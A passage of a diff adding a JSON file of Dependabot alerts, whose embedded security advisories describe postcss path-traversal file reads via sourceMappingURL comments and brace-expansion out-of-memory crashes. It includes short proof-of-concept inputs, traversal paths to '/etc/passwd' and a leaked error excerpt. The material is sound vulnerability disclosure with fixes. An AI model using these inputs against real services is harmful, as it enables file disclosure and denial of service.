'/tmp/pcpoc/in.css', map: true })\n  console.log('with from -> leaked:', !!leaks(b.map))    // false\n})()\n```\n\nObserved output on postcss 8.5.22:\n\n```\nno from   -> leaked: true      # sourcesContent 'TOP_SECRET_abcdef' AND sources '/etc/REAL_PATH_LEAK' appear in result.map\nwith from -> leaked: false     # guard rejects the absolute path\n```\n\n`../` traversal (no `from`) also succeeds; non-`.map` targets (`.txt`, `?x=.map`, `#.map`) are blocked by the `.map` check. The tested build contains the GHSA-6g55 fix (`this.json = JSON.parse(...)` in `loadMap`, `consumer()` uses `this.json || this.text`), so this is a residual of that fix.\n\n## Impact\n\nArbitrary `.map`-file read (absolute path or `../` traversal) and disclosure of the target map's `sources` (local filesystem paths) and `sourcesContent` (source) into the generated source map, for any consumer that runs PostCSS on attacker-influenced CSS without a `from` option and exposes `result.map` (online CSS playgrounds, minify/lint services, string-input build steps). Bounded to files ending in `.map` that parse as JSON.\n\n## Suggested fix\n\nApply the traversal/absolute-path rejection to the untrusted map path regardless of whether `cssFile` is present (resolve against `process.cwd()` when there is no `cssFile`, and reject absolute paths and `..` escape in all untrusted cases), or refuse to load an untrusted external map when no base file is known.",
+      "severity": "medium",
+      "identifiers": [
+        {
+          "value": "GHSA-fxqj-rqcc-2cmp",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-69153",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/postcss/postcss/security/advisories/GHSA-fxqj-rqcc-2cmp"
+        },
+        {
+          "url": "https://github.com/postcss/postcss/commit/7beca139e70f9075c6b19700fcb00dd8033e5da8"
+        },
+        {
+          "url": "https://github.com/postcss/postcss/releases/tag/8.5.19"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-fxqj-rqcc-2cmp"
+        }
+      ],
+      "published_at": "2026-08-03T17:11:39Z",
+      "updated_at": "2026-08-03T17:11:40Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "postcss"
+          },
+          "severity": "medium",
+          "vulnerable_version_range": "<= 8.5.22",
+          "first_patched_version": {
+            "identifier": "8.5.23"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": 0.0
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+          "score": 6.3
+        }
+      },
+      "epss": {
+        "percentage": 0.00313,
+        "percentile": 0.23659
+      },
+      "cvss": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-22",
+          "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+        },
+        {
+          "cwe_id": "CWE-200",
+          "name": "Exposure of Sensitive Information to an Unauthorized Actor"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "postcss"
+      },
+      "severity": "medium",
+      "vulnerable_version_range": "<= 8.5.22",
+      "first_patched_version": {
+        "identifier": "8.5.23"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/22",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/22",
+    "created_at": "2026-08-21T01:04:42Z",
+    "updated_at": "2026-08-21T01:04:42Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 21,
+    "state": "auto_dismissed",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "brace-expansion"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "development",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-rgw5-rvv9-x895",
+      "cve_id": "CVE-2026-69152",
+      "summary": "brace-expansion: DoS via unbounded intermediate arrays, bypassing the CVE-2026-14257 mitigation",
+      "description": "### Summary\n\nThe `maxLength` mitigation added in `5.0.8` for GHSA-mh99-v99m-4gvg / CVE-2026-14257 is incomplete. It bounds the accumulator where results are *combined*, but not the intermediate arrays that feed it. A ~25 KB input still crashes the Node process with an **uncatchable** out-of-memory error, so `try/catch` around `expand()` does not help.\n\nA second, related path in the same function lets a ~400 KB input block the event loop for over two minutes without ever exceeding the memory bound.\n\n### Details\n\n`maxLength` was enforced in `combine()`, the single place output grows. Two arrays are built *before* `combine()` runs, and neither was bounded.\n\n**1. Comma alternatives accumulate without a running total (memory exhaustion)**\n\nEach alternative in `{a,b,c,...}` is expanded by its own recursive `expand_()` call, so each receives a full, independent `maxLength` allowance. The results were then concatenated into a single `values` array with no cumulative limit:\n\n```js\nvalues = []\nfor (let j = 0; j < n.length; j++) {\n  values.push.apply(values, expand_(n[j], max, maxLength, false))\n}\n\nacc = combine(acc, pre, values, max, maxLength, ...)\n```\n\nWith `A` alternatives, `values` can reach `A * maxLength` characters before `combine()` gets a chance to truncate it. At the default `maxLength` of 4,000,000 and 400 alternatives, that is well past any default heap.\n\n**2. Padded sequences ignore `maxLength` while generating (CPU exhaustion)**\n\n`expandSequence()` was bounded by `max` (the result *count*) but never consulted `maxLength`. A padded sequence's element width follows the input, so `{0...01..100000}` with a wide pad generates `max` elements, each as wide as the input, only for `combine()` to discard all but a handful.\n\nMemory stays flat here, because V8 represents the padded strings as cons-strings, which is likely why this path was not caught alongside the original issue. The cost is time: work proportional to `max * width`.\n\n| pad width | input bytes | results kept | time (5.0.8) | time (patched) |\n|---|---|---|---|---|\n| 20,000 | 20 KB | 199 | ~7.3 s | ~20 ms |\n| 100,000 | 100 KB | 39 | ~32 s | ~20 ms |\n| 400,000 | 400 KB | 9 | ~124 s | ~18 ms |\n\nOutput is byte-identical before and after the fix; only the wasted work is removed.\n\n### Proof of concept\n\nMemory exhaustion, against `5.0.8`:\n\n```js\nimport { expand } from 'brace-expansion'\n\nconst part = '{' + '0'.repeat(50) + '1..100000}'\nconst input = '{' + Array(400).fill(part).join(',') + '}'  // ~25 KB\n\ntry {\n  expand(input)\n} catch (e) {\n  // never reached - the process is already dead\n}\n```\n\n```\nFATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory\nAborted\n```\n\nEvent-loop stall, against `5.0.8`:\n\n```js\nimport { expand } from 'brace-expansion'\n\n// ~400 KB input, returns 9 results after roughly two minutes of blocking CPU\nexpand('{' + '0'.repeat(400_000) + '1..100000}')\n```\n\n### Impact\n\nDenial of service. Any application that passes attacker-controlled input to `expand()`, directly or transitively through a glob or pattern-matching library, can be remotely crashed or stalled. The out-of-memory variant terminates the process and cannot be handled with `try/catch`.\n\nApplications already on `5.0.8` are affected: the `5.0.8` mitigation does not cover these paths.\n\n### Patches\n\nBoth intermediate arrays are now bounded as they are built, using the same `max` and `maxLength` limits already applied in `combine()`:\n\n- `values` tracks a running result count and character length while alternatives are appended, and stops once either bound is reached.\n- `expandSequence()` accepts `maxLength` and stops generating once the sequence's own characters reach it.\n\nAs with the existing limits, output is truncated rather than allowed to grow without bound, which matches how `max` already behaves. The defaults sit well above any realistic expansion, so legitimate input is unaffected.\n\n### Workarounds\n\nIf upgrading is not immediately possible, avoid passing untrusted input to `expand()` or to glob brace patterns, or pass an explicitly small `max` **and** `maxLength`.\n\nNote that a small `maxLength` alone was not sufficient on affected versions: it was applied per alternative rather than cumulatively, which is the root of the first issue above.\n\n### Credits\n\nThe memory-exhaustion bypass was reported by Alessio Della Libera, CEO & Co-founder at [Numyra](https://numyra.ai/).\n\nThe sequence-generation issue was found while verifying that report.",
+      "severity": "high",
+      "identifiers": [
+        {
+          "value": "GHSA-rgw5-rvv9-x895",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-69152",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-rgw5-rvv9-x895"
+        },
+        {
+          "url": "https://github.com/juliangruber/brace-expansion/commit/139d015104e71433ad52a41d19467c48ecbb2c7d"
+        },
+        {
+          "url": "https://github.com/juliangruber/brace-expansion/commit/1e30c930238d7162802d88a94189182def178dac"
+        },
+        {
+          "url": "https://github.com/juliangruber/brace-expansion/commit/688a99eeaab02627c2b89ba8ba4821fecfa659cf"
+        },
+        {
+          "url": "https://github.com/juliangruber/brace-expansion/commit/cb4b9e47cc2ec777c14b2b4492fb431a56f6a031"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-69152"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-rgw5-rvv9-x895"
+        }
+      ],
+      "published_at": "2026-08-03T16:35:32Z",
+      "updated_at": "2026-08-03T20:17:20Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "brace-expansion"
+          },
+          "severity": "high",
+          "vulnerable_version_range": "< 1.1.18",
+          "first_patched_version": {
+            "identifier": "1.1.18"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "brace-expansion"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 2.0.0, < 2.1.4",
+          "first_patched_version": {
+            "identifier": "2.1.4"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "brace-expansion"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 3.0.0, < 3.0.6",
+          "first_patched_version": {
+            "identifier": "3.0.6"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "brace-expansion"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 4.0.0, < 5.0.9",
+          "first_patched_version": {
+            "identifier": "5.0.9"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "score": 7.5
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.00411,
+        "percentile": 0.33772
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption"
+        },
+        {
+          "cwe_id": "CWE-770",
+          "name": "Allocation of Resources Without Limits or Throttling"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "brace-expansion"
+      },
+      "severity": "high",
+      "vulnerable_version_range": ">= 2.0.0, < 2.1.4",
+      "first_patched_version": {
+        "identifier": "2.1.4"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/21",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/21",
+    "created_at": "2026-08-21T01:04:42Z",
+    "updated_at": "2026-08-21T01:04:42Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": "2026-08-21T01:04:42Z"
+  },
+  {
+    "number": 20,
+    "state": "auto_dismissed",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "brace-expansion"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "development",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-mh99-v99m-4gvg",
+      "cve_id": "CVE-2026-14257",
+      "summary": "brace-expansion: DoS via unbounded expansion length causing an out-of-memory process crash",
+      "description": "### Summary\n\n`expand()` bounds the *number* of results it produces (the `max` option,\n`100_000` by default) but not their *length*. By chaining many brace groups,\nan attacker keeps the result count under `max` while making every result grow\nwith the number of groups. Building `max` long results — plus the intermediate\narrays combined at each brace group — exhausts memory and crashes the Node\nprocess with an **uncatchable** out-of-memory error. `try/catch` around\n`expand()` does not help: the fatal error terminates the process.\n\nA ~7.5 KB input (`'{a,b}'.repeat(1500)`) is enough to crash a default Node\nprocess.\n\n### Details\n\nFor `N` chained brace groups such as `'{a,b}'.repeat(N)`:\n\n- the result count is `2^N`, immediately capped at `max` (`100_000`), so the\n  `max` protection appears to hold, but\n- each result is `N` characters long, so the total output size is\n  `max × N` characters, which grows without bound in `N`.\n\n`expand_` combines each brace set with the fully-expanded tail:\n\n```js\nconst post = m.post.length ? expand_(m.post, max, false) : ['']\n...\nfor (let j = 0; j < N.length; j++) {\n  for (let k = 0; k < post.length && expansions.length < max; k++) {\n    const expansion = pre + N[j] + post[k]   // grows one group longer per level\n    ...\n    expansions.push(expansion)\n  }\n}\n```\n\nThe loop guard `expansions.length < max` limits how many strings are built, but\nnothing limits how long they get. Each recursion level materializes another\narray of up to `max` strings, one character longer than the level below, and —\nbecause V8 represents `pre + N[j] + post[k]` as a cons-string (rope) that\nreferences `post[k]` — those intermediate strings stay reachable through the\nwhole chain. Memory therefore scales with `max × N`.\n\nMeasured on `5.0.7` (`'{a,b}'.repeat(N)`, default `max`):\n\n| groups (N) | input bytes | result count | peak RSS |\n|---|---|---|---|\n| 20 | 100 | 100,000 | ~80 MB |\n| 50 | 250 | 100,000 | ~214 MB |\n| 100 | 500 | 100,000 | ~409 MB |\n| 300 | 1,500 | 100,000 | ~1,148 MB |\n| 1500 | 7,500 | — | **OOM crash** |\n\n### Proof of concept\n\n```js\nconst { expand } = require('brace-expansion')\n\n// ~7.5 KB input — crashes the process with a fatal, uncatchable OOM:\n//   FATAL ERROR: ... JavaScript heap out of memory\ntry {\n  expand('{a,b}'.repeat(1500))\n} catch (e) {\n  // never reached — the process is already dead\n}\n```\n\n### Impact\n\nAny application that passes attacker-influenced strings to\n`brace-expansion.expand()` — directly, or transitively via `minimatch` / `glob`\nbrace patterns — can be crashed by a small request. Because the failure is a\nfatal V8 out-of-memory error rather than a thrown exception, it cannot be caught\nand it takes down the whole worker/process, denying service.\n\n### Remediation\n\nUpgrade to a patched release. The fix bounds the total number of characters a\nsingle `expand()` call may accumulate (`EXPANSION_MAX_LENGTH`, default\n`4_000_000`, configurable via a new `maxLength` option), applied inside the\noutput-building loops so intermediate arrays are bounded too. Once the limit is\nreached, output is truncated — consistent with how `max` already truncates —\ninstead of growing without bound. The limit sits well above any realistic\nexpansion (100,000 results hitting `max` measure ~1M characters), so legitimate\ninput is unaffected.\n\nAfter the fix, `'{a,b}'.repeat(1500)` returns a bounded, truncated result in\n~0.7 s using ~340 MB and never crashes, including under a constrained 512 MB\nheap.\n\nThe fix bounds memory but the algorithm still rebuilds intermediate arrays at\neach level (roughly `O(N × maxLength)` work on this input class). A streaming\nrewrite that produces output in `O(total output size)` can be a non-urgent\nfollow-up.\n\nIf immediate upgrade isn't possible, avoid passing untrusted input to\n`expand()` / glob brace patterns, or pass a small explicit `max` **and**\n`maxLength`.",
+      "severity": "high",
+      "identifiers": [
+        {
+          "value": "GHSA-mh99-v99m-4gvg",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-14257",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-mh99-v99m-4gvg"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-14257"
+        },
+        {
+          "url": "https://github.com/juliangruber/brace-expansion/commit/a1bd33999ea75262c4749fff3bbb0d1372bd07b5"
+        },
+        {
+          "url": "https://github.com/juliangruber/brace-expansion"
+        },
+        {
+          "url": "https://www.npmjs.com/package/brace-expansion"
+        },
+        {
+          "url": "https://github.com/juliangruber/brace-expansion/pull/129"
+        },
+        {
+          "url": "https://github.com/juliangruber/brace-expansion/pull/130"
+        },
+        {
+          "url": "https://github.com/juliangruber/brace-expansion/pull/136"
+        },
+        {
+          "url": "https://github.com/juliangruber/brace-expansion/commit/139d015104e71433ad52a41d19467c48ecbb2c7d"
+        },
+        {
+          "url": "https://github.com/juliangruber/brace-expansion/commit/cb4b9e47cc2ec777c14b2b4492fb431a56f6a031"
+        },
+        {
+          "url": "https://github.com/juliangruber/brace-expansion/commit/d13ff455a58b0d56704f0111e3c2a0b16ceb06eb"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-mh99-v99m-4gvg"
+        }
+      ],
+      "published_at": "2026-07-24T21:53:14Z",
+      "updated_at": "2026-07-31T19:37:57Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "brace-expansion"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 4.0.0, < 5.0.8",
+          "first_patched_version": {
+            "identifier": "5.0.8"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "brace-expansion"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 3.0.0, < 3.0.3",
+          "first_patched_version": {
+            "identifier": "3.0.3"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "brace-expansion"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 2.0.0, < 2.1.3",
+          "first_patched_version": {
+            "identifier": "2.1.3"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "brace-expansion"
+          },
+          "severity": "high",
+          "vulnerable_version_range": "< 1.1.17",
+          "first_patched_version": {
+            "identifier": "1.1.17"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "score": 7.5
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.00339,
+        "percentile": 0.26501
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption"
+        },
+        {
+          "cwe_id": "CWE-770",
+          "name": "Allocation of Resources Without Limits or Throttling"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "brace-expansion"
+      },
+      "severity": "high",
+      "vulnerable_version_range": ">= 2.0.0, < 2.1.3",
+      "first_patched_version": {
+        "identifier": "2.1.3"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/20",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/20",
+    "created_at": "2026-08-21T01:04:42Z",
+    "updated_at": "2026-08-21T01:04:42Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": "2026-08-21T01:04:42Z"
+  },
+  {
+    "number": 19,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "postcss"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-r28c-9q8g-f849",
+      "cve_id": "CVE-2026-73646",
+      "summary": "PostCSS: Path Traversal in Previous Source Map Auto-Loading (sourceMappingURL) leads to Arbitrary .map File Disclosure",
+      "description": "## Vulnerability Details\n\n**File**: `lib/previous-map.js`\n**Line**: 87-98 (`loadFile`), 129-144 (`loadMap`)\n\n\n### Root Cause\nPostCSS auto-detects a `/*# sourceMappingURL=... */` comment inside the CSS text it is asked to parse and, unless the caller explicitly passes `map: false`, attempts to load that path from disk as a \"previous source map.\" This happens on every `postcss.parse()` / `postcss().process()` call by default (opt-out, not opt-in).\n\n`loadMap()` builds the candidate path via `join(dirname(opts.from), annotation)`, where `annotation` is the raw, attacker-controlled string from the CSS comment. `path.join()` normalizes but does not sandbox `..` segments, so a `../../../` prefix walks the resolved path outside the intended directory. If `opts.from` is not set at all, the annotation is used completely unmodified — an absolute path in the CSS comment is read verbatim.\n\n8.5.12 already fixed a strictly worse variant of this (any file, any extension, could be read) by requiring the resolved path to end in `.map` (`loadFile()`). That fix did not address the traversal itself, only the target extension. Since the `join(dirname(file), map)` logic has existed unchanged since PostCSS 8.0.0 (Feb 2020), any file ending in `.map` remains readable through this path in the current release (8.5.16).\n\nOnce loaded, `MapGenerator.isMap()` treats the mere presence of a loaded \"previous map\" as an implicit request to generate `result.map`, even when the caller never set the `map` option. If the loaded map has a `sourcesContent` field (common for maps emitted by bundlers/transpilers), that content is merged into `result.map` and returned to the caller — disclosing the traversed-to file's content to whoever supplied the CSS.\n\n### Attack Scenario\n1. A service accepts user-submitted CSS and runs it through PostCSS to lint/format/transform it, e.g. `postcss().process(userCss, { from: '/app/uploads/user123/input.css', to: '/app/uploads/user123/output.css' })` — idiomatic usage; `map` option untouched.\n2. Attacker submits CSS containing `/*# sourceMappingURL=../../../../some/other/app/dist/bundle.js.map */` (or an absolute path if `from` is unset).\n3. PostCSS reads that `.map` file and folds its `sourcesContent` into `result.map`.\n4. The service does what most build pipelines do with a truthy `result.map` — writes it next to the CSS output or returns it via API (source maps are meant to be consumed by browser devtools, so this is commonly public/served).\n5. Attacker retrieves the emitted map and reads out the traversed file's content.\n\n### Impact\nDisclosure of the contents of arbitrary `.map` files reachable via path traversal (or absolute path when `from` is unset) from the process's filesystem. Affects any application processing CSS it does not fully trust without explicitly passing `map: false`. No authentication or user interaction beyond submitting CSS text is required.\n\n### Vulnerable Code\n```js\nloadFile(path, cssFile, trusted) {\n  if (!trusted && !this.unsafeMap) {\n    if (!/\\.map$/i.test(path)) {\n      return undefined\n    }\n  }\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()\n  }\n}\n\nloadMap(file, prev) {\n  ...\n  } else if (this.annotation) {\n    let map = this.annotation\n    if (file) map = join(dirname(file), map)\n    let unknown = this.loadFile(map, file, false)\n    ...\n  }\n}\n```\n\n### Recommended Fix\nConstrain the resolved path to remain inside the CSS file's own directory instead of relying solely on a filename-extension check:\n```js\nloadFile(path, cssFile, trusted) {\n  if (!trusted && !this.unsafeMap) {\n    if (!/\\.map$/i.test(path)) {\n      return undefined\n    }\n    if (!cssFile) return undefined\n    let root = resolve(dirname(cssFile))\n    let resolvedPath = resolve(root, path)\n    if (resolvedPath !== root && !resolvedPath.startsWith(root + sep)) {\n      return undefined\n    }\n  }\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()\n  }\n}\n```\nI've implemented, tested (full existing test suite — 660/660 passing, plus new PoC-based regression checks for both the traversal and legitimate same-directory cases), and can share this fix on request or via a private fork if invited.\n\n### Verification\nDynamically confirmed on v8.5.16 (current npm release / repo HEAD) via a standalone Node.js harness against `lib/postcss.js`: a \"secret\" `.map` file placed two directories outside a simulated project directory was read via a crafted `sourceMappingURL` comment in otherwise-innocuous CSS, with its `sourcesContent` appearing verbatim in `result.map.toString()` — with no `map` option set by the caller. A second harness confirmed the simpler no-`from` case reads an absolute path directly. A third harness confirmed `map: false` is the only current workaround. The attached fix branch closes both vectors while keeping all 660 existing unit tests green.",
+      "severity": "high",
+      "identifiers": [
+        {
+          "value": "GHSA-r28c-9q8g-f849",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-73646",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/postcss/postcss/security/advisories/GHSA-r28c-9q8g-f849"
+        },
+        {
+          "url": "https://github.com/postcss/postcss/commit/95663d3eb7ba26f4854dd19d3b4f4425760cf56c"
+        },
+        {
+          "url": "https://github.com/postcss/postcss/releases/tag/8.5.18"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-r28c-9q8g-f849"
+        }
+      ],
+      "published_at": "2026-07-24T16:24:55Z",
+      "updated_at": "2026-08-13T17:55:56Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "postcss"
+          },
+          "severity": "high",
+          "vulnerable_version_range": "<= 8.5.17",
+          "first_patched_version": {
+            "identifier": "8.5.18"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "score": 7.5
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.00377,
+        "percentile": 0.30789
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "score": 7.5
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-22",
+          "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "postcss"
+      },
+      "severity": "high",
+      "vulnerable_version_range": "<= 8.5.17",
+      "first_patched_version": {
+        "identifier": "8.5.18"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/19",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/19",
+    "created_at": "2026-08-21T01:04:42Z",
+    "updated_at": "2026-08-21T01:04:42Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 18,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "postcss"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-6g55-p6wh-862q",
+      "cve_id": "CVE-2026-45623",
+      "summary": "PostCSS: Arbitrary file read and information disclosure via attacker-controlled sourceMappingURL in CSS comments",
+      "description": "## Summary\n\nPostCSS's `PreviousMap` parses the `/*# sourceMappingURL=PATH */` comment from any CSS string passed to `process()` and dereferences `PATH` against the local filesystem with no scheme, allowlist, or traversal check. An attacker who controls the CSS input can cause the host process to read any file readable by Node and leak the first ~10 bytes of its content through the resulting `JSON.parse` `SyntaxError` message. The bug also yields a precise file-existence oracle and a controllable-read primitive that may be combined with large-file targets for DoS. The behaviour is triggered with PostCSS's default options — no `from`, no `map`, no plugins required — and is therefore reachable from any pipeline that runs untrusted CSS through PostCSS (CMS themes, user-uploaded styles, browser-extension/userstyle processors, build pipelines for third-party packages, blog comment renderers, etc.).\n\n## Details\n\nThe dangerous chain lives in `lib/previous-map.js` and is wired into every `Input` construction at `lib/input.js:70-77`.\n\n`Input` constructor (`lib/input.js:70-77`):\n\n```js\nif (pathAvailable && sourceMapAvailable) {\n  let map = new PreviousMap(this.css, opts)\n  if (map.text) {\n    this.map = map\n    let file = map.consumer().file\n    if (!this.file && file) this.file = this.mapResolve(file)\n  }\n}\n```\n\n`PreviousMap` constructor (`lib/previous-map.js:17-29`):\n\n```js\nconstructor(css, opts) {\n  if (opts.map === false) return\n  this.loadAnnotation(css)\n  this.inline = this.startWith(this.annotation, 'data:')\n\n  let prev = opts.map ? opts.map.prev : undefined\n  let text = this.loadMap(opts.from, prev)\n  ...\n}\n```\n\nNote `opts.map === false` is the only short-circuit. With default options (`opts.map === undefined`), the rest of the constructor — including the filesystem read — executes.\n\n`loadAnnotation` (`lib/previous-map.js:72-84`) extracts the URL **without sanitisation**:\n\n```js\nloadAnnotation(css) {\n  let comments = css.match(/\\/\\*\\s*# sourceMappingURL=/g)\n  if (!comments) return\n  let start = css.lastIndexOf(comments.pop())\n  let end = css.indexOf('*/', start)\n  if (start > -1 && end > -1) {\n    this.annotation = this.getAnnotationURL(css.substring(start, end))\n  }\n}\n```\n\n`getAnnotationURL` (`lib/previous-map.js:59-61`) only strips the `/*# sourceMappingURL=` prefix and trims whitespace — no scheme check, no path normalisation, no allowlist.\n\n`loadMap` (`lib/previous-map.js:124-128`) — when `prev` is absent and the annotation is not an inline `data:` URI:\n\n```js\n} else if (this.annotation) {\n  let map = this.annotation\n  if (file) map = join(dirname(file), map)\n  return this.loadFile(map)\n}\n```\n\n* If `opts.from` is unset, `file` is undefined and the raw attacker-supplied path (e.g. `/etc/passwd`) is used directly.\n* If `opts.from` is set, `path.join(dirname(file), attackerPath)` is used. `path.join` does **not** block `..` segments, so `../../../../../etc/passwd` resolves outside the intended directory.\n\n`loadFile` (`lib/previous-map.js:86-92`) is the sink:\n\n```js\nloadFile(path) {\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()\n  }\n}\n```\n\nThe bytes are stored in `this.text`. `Input` immediately invokes `map.consumer()` (`lib/input.js:74`), which constructs a `SourceMapConsumer` (`lib/previous-map.js:33`). When the file is not valid source-map JSON (the common case), `source-map-js` calls `JSON.parse`, and V8's `SyntaxError` message embeds the first ~10 bytes of the file content:\n\n```\nUnexpected token 'r', \"root:x:0:0\"... is not valid JSON\n```\n\nThis error is propagated back to the caller. Any application that surfaces PostCSS errors (logs, HTTP 500 responses, build-tool output, debug pages) discloses those bytes to the 